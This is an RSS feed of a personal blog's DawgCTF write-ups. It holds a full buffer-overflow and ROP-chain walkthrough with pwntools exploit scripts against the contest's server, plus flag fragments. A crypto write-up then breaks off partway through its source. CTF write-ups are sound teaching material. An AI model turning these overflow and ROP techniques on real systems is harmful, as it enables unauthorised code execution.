@@ -1,0 +1,533 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>DawgCTF on Welcome!</title>
+        <link>http://localhost:1313/webPablo/posts/dawgctf/</link>
+        <description>Recent content in DawgCTF on Welcome!</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Mon, 21 Apr 2025 00:00:00 +0000</lastBuildDate>
+        <atom:link href="http://localhost:1313/webPablo/posts/dawgctf/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>[PWN] 64 bits in my ark and texture</title>
+            <link>http://localhost:1313/webPablo/posts/dawgctf/64-bits/</link>
+            <pubDate>Mon, 21 Apr 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/webPablo/posts/dawgctf/64-bits/</guid>
+            <description>Challenge: 64 bits in my Ark and Texture (300 points) Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation. nc connect.umbccd.net 22237
+Alongside this, we are provided with a binary file. When we execute the file 3 basic questions about x86-64 appear. Once we answer the first three questions (2, 1, 4), the first part of the real challenge is proposed:
+They ask us to simply jump to a memory address, if we run this binary with ghidra or binaryNinja (tools for analyzing compiled software) wen can see the first vulnerability.</description>
+            <content type="html"><![CDATA[<p>Challenge:
+<strong>64 bits in my Ark and Texture (300 points)
+Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.
+nc connect.umbccd.net 22237</strong></p>
+<p>Alongside this, we are provided with a binary file. When we execute the
+file 3 basic questions about x86-64 appear.
+Once we answer the first three questions (2, 1, 4), the first part of the real
+challenge is proposed:</p>
+<p><img src="/webPablo/images/questions.png" alt="Questions"></p>
+<p>They ask us to simply jump to a memory address, if we run this binary with
+ghidra or binaryNinja (tools for analyzing compiled software) wen can see
+the first vulnerability.</p>
+<p><img src="/webPablo/images/binary.png" alt="Binary"></p>
+<p>At the end of the main function we can see that is using fgets() to read the user input.
+The problem is that is reading 0x200 bytes (0x200 in hexadecimal = 512 bytes) and storing
+it in a variable buf. But since buf is defined as int64_t it means it can only store 8 bytes.</p>
+<p>For later use keep in mind that the names of the functions we are going to use are:
+-main
+-win1
+-win2
+-win3
+All of these can be seen when the binary is run with gdb, ghidra&hellip; They will make our life
+easier since we will not have to deal with little/big endian.</p>
+<p>This leads us to a buffer overflow vulnerability, since we can input more bytes than
+the variable is able to deal with, we can overwrite memory addresses.
+For us to make a call to another function we need to understand some basic things.</p>
+<p>Once a function finishes it knows where to jump thanks to the return pointer (rsp), that stores
+the address of the next function. That is to say that we need to find where the rsp is and overwrite
+the address with the one we want.</p>
+<p>So the first thing we need to know is how much data weneed to input before overwriting
+this pointer. For this I&rsquo;m goint to be using gdb with pwn.</p>
+<p>First we run in our terminal gdb ./chall, when we are alredy inside of pwndgb we can enter the
+command run and answer the questions. Once we answer them we have to make a little script with
+python that will allow as to know the number of character we need to introduce.</p>
+<p>These 3 lines of code allow us to create a pattern, of length 200. Once we have that
+we print it and copy it to out clipboard.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>print(pattern<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><p>This will print something like: aabbacabwbbbcawewca&hellip; Which might seem random letters
+but they do have a specific order.</p>
+<p>Now we enter this pattern and see that the program failed, we accessed something that we
+shouldn&rsquo;t in the memory and it broke. But if we scroll down a little bit we can see some
+interesting report that pwndgb shows to us.</p>
+<p><img src="/webPablo/images/first.png" alt="Error"></p>
+<p>We can see the value of rsp with some letters that seem familiar, part of the pattern
+we introduced.</p>
+<p><img src="/webPablo/images/error.png" alt="rsp"></p>
+<p>Now that we have this we can run another command with python. This will tell us
+the number of letters we need to reach this part of the pattern. So if this prints
+30 it means that we could inject 30 random letters and then after that we would be
+overwriting the rsp.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(cyclic_find(<span style="color:#e6db74">&#34;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span></code></pre></div><p>And this prints 152, meaning that after 152 characters we can point to wherever we want and the program will
+jump there.</p>
+<p>We are going to use another python file to complete this task.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># to skip security checks if we already know the result</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (you can check manually with: checksec --file=./chall)</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we are working with a 64-bit x86 binary</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># build the payload.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and then sent to the remote process. (Remember the statement)</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>With this we can achieve what we wanted but is not enough now they ask us to do the following.</p>
+<p><strong>You have passed the first challenge. The next one won&rsquo;t be so simple.
+Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to
+the temple of 0x401314 to claim your advance.DawgCTF{C0ngR4tul4t10ns_
+Continue:</strong></p>
+<p>We need to call another function but in this case with an argument. Now we need to understand how to call a function in this case.
+Here comes to play the title of the challenge (64-bits).</p>
+<p>Let&rsquo;s look at the image below, above the return pointer there are arguments from 7 to
+n and below the pointer, the registers. When a function is called in 32 bit architecture all the arguments are passed directly to the stack.</p>
+<p>But in this case we are working in a 64 bits architecture and when calling a function the first 6 parameters are stored in different registers.
+That&rsquo;s why in the image the arguments start from the 7th.</p>
+<p><img src="/webPablo/images/stack.png" alt="stack"></p>
+<p>Now that we know this we can take a look at which are the registers that are used for the arguments. Since we are only going to need
+1 argument we will use the first one, rdi.</p>
+<p><img src="/webPablo/images/registers.png" alt="registers"></p>
+<p>Before rewriting the script we need to understand this, once the first bufferoverflow is done calling win1 we can then concatenate the next payload. There
+is no need to make another bufferoverflow and run them separately, since we are alredy stacking them in the stack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec to False to skip security checks</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># if we already know the result (you can check manually in the terminal </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># with: checksec --file=./chall)</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools knows we are working with a 64-bit x86 binary</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build the payload.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The payload is constructed locally using the ELF binary and then sent to the remote process.</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right before the return address</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures the stack is 16-byte aligned before a function call)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid crashes or undefined behavior.</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function argument in the rdi register</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>Now we are presented with the last challenge.
+<strong>You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and
+[0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
+d15c1p13_y0u_
+Final Test:</strong></p>
+<p>This is no different than the previous one, we just need to concatenate the 3 payloads and this is the final script. And like we
+saw in a photo earlier we need the 3 register that pass the first 3 arguments, rdi, rsi and rdx.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary as an ELF object. We set checksec</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># to False to skip security checks if we already know</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># the result (you can check manually with: checksec --file=./chall)</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># It&#39;s good practice to define the context so pwntools</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># knows we are working with a 64-bit x86 binary</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Open the remote connection</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the correct answers to the initial quiz questions</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#All three payloads will be executed in a row. This means</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we don’t need to perform three separate buffer overflows.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After the first overflow, we can place all return addresses</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># on the stack, and they will be executed sequentially.That&#39;s</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># why we build everything together and send it in a single rop.chain() call.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 1 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a ROP (Return Oriented Programming) object to build</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># the payload. The payload is constructed locally using the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ELF binary and then sent to the remote process.</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fill the buffer with 152 characters, stopping right</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># before the return address.</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">152</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert a &#39;ret&#39; gadget to align the stack (this ensures</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># the stack is 16-byte aligned before a function call).</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is sometimes required on x86-64 systems to avoid</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># crashes or undefined behavior.</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 2 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Similar approach, but now we add the first function</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># argument in the rdi register</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------- PAYLOAD 3 ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now we add values for rdi, rsi, and rdx registers</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for a function that expects three arguments</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeafface</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfeedcafe</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win3&#34;</span>)
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;exit&#34;</span>)  <span style="color:#75715e"># Graceful exit after payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the full payload chain</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Handle any final prompts and interaction</span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Continue:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Test:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p><strong>Congratulations. You are deserving of you reward
+4r3_r34dy_2_pwn!}</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>[Cryptography] Baby-RSA 2</title>
+            <link>http://localhost:1313/webPablo/posts/dawgctf/baby-rsa2/</link>
+            <pubDate>Sat, 19 Apr 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/webPablo/posts/dawgctf/baby-rsa2/</guid>
+            <description>Challenge: If all I have to do is keep my factors p and q secret, then I can save computation time by sharing the same modulus between all my friends. I&amp;rsquo;ll give them unique e and d pairs to encrypt and decrypt messages. Sounds secure to me!
+For this we are given 2 files. The first one is a .py and the second one what prints.
+from Crypto.Util.number import * from secret import flag # This is my stuff!</description>
+            <content type="html"><![CDATA[<p>Challenge:
+<strong>If all I have to do is keep my factors p and q secret, then I can save</strong>
+<strong>computation time by sharing the same modulus between all my friends. I&rsquo;ll</strong>
+<strong>give them unique e and d pairs to encrypt and decrypt messages. Sounds secure to me!</strong></p>
+<p>For this we are given 2 files. The first one is a .py and the second one what prints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> flag
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is my stuff! Don&#39;t look at it</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">512</span>)
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">512</span>)
+</span></span><span style="display:flex;"><span>N <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e_priv <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d_priv <span style="color:#f92672">=</span> inverse(e_priv, phi)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> bytes_to_long(flag)
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> pow(m, e_priv, N)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is your stuff!</span>
+</span></span><span style="display:flex;"><span>e_pub <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>d_pub <span style="color:#f92672">=</span> inverse(e_pub, phi)
+</span></span><span style="display:flex;"><span>
